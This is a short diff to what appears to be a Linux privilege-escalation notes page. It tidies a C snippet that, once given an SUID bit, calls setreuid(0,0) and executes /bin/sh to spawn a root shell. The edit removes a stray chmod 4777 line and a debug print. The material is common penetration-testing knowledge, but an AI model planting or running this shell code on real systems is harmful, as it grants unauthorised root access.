@@ -40,7 +40,6 @@ Check any binaries in the above lists, both what they do and the version number.
 If you have a method of adding an SUID bit to a custom executable the following quick and dirty solution will work:
 
 ```c
-chmod 4777 exploit
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -48,7 +47,6 @@ chmod 4777 exploit
 int main( int argc, char *argv[] )
 {
     setreuid(0, 0);
-    printf("ID: %d\n", geteuid());
     execve("/bin/sh", NULL, NULL);
 }
 ```
